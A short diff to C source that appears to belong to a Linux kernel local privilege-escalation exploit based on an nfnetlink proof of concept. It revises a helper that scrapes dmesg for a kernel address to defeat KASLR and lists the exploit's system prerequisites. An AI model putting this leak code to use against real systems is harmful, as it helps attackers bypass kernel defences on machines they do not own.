@@ -5,8 +5,7 @@
 //
 // Requires:
 // - kernel.unprivileged_userns_clone = 1; (Default on Ubuntu systems)
-// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems);
-//   or CAP_SYSLOG capabilities.
+// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
 //
 // Based on original trigger PoC code by vn1k:
 // - https://github.com/duasynt/meh/blob/master/nfnetlink1019.c
@@ -97,25 +96,25 @@ int mmap_syslog(char **buffer, int *size) {
 }
 
 unsigned long search_dmesg(char *needle) {
+  char *addr_buf;
   char *syslog;
+  char *substr;
   int size;
-  const int addr_len = 16; /* 64-bit */
+  char *endptr;
   unsigned long addr = 0;
 
   if (mmap_syslog(&syslog, &size))
     return 0;
 
-  char *substr = (char *)memmem(&syslog[0], size, needle, strlen(needle));
+  substr = (char *)memmem(&syslog[0], size, needle, strlen(needle));
   if (substr == NULL)
     return 0;
 
-  char *addr_buf;
   addr_buf = strstr(substr, "<ffffffff");
   if (addr_buf == NULL)
     return 0;
 
-  char *endptr = &addr_buf[addr_len];
-  addr = strtoul(&addr_buf[1], &endptr, 16);
+  addr = strtoull(&addr_buf[1], &endptr, 16);
 
   if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
     return addr;
